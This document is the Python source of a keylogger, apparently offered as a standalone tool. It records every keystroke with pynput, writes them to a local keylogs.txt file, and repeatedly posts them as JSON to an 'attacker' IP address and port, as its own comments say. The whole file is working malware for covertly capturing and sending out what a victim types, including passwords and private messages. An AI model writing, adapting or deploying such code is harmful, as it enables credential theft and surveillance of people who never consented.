from pynput import keyboard
import os
import requests
import json
import threading


#attacker prefered ip adress
ipadress="ip_address"

#attacker prefered port adress
port="listened_port_address"

curworkdir=os.getcwd()

file_path = curworkdir + "\keylogs.txt"

#empty list to collect keyboard events
events=[]

time_interval = 100


#saving keyboard events on local for  multipurpose usage in future
def save_file(lists):
    listostr = ' '.join(map(str ,lists))
    opened=open(file_path, "w")
    writedfile=opened.write(listostr)


#recursive function to send keystrokes data to attacker without saving 
def postwithoutsave():
    global events
    stevents=str(events)
    payload = json.dumps({"Data" : stevents})
    response=requests.post(url=f"{ipadress}:{port}", data=payload, headers={"Content-Type" : "application/json"})
    timer=threading.Timer(time_interval,postwithoutsave)
    timer.start()
    if response.status_code == 201:
        print("Post method executed")
    else:
        print("Fail...")    


def on_press(key):
    global events
    events.append(key)
    if key == keyboard.Key.esc:
        
        # Stop listener
        return False
    
    

def on_release(key):
    print('{0} released'.format(key))
    

# Collecting events until released
with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()


    save_file(lists=events)

    postwithoutsave()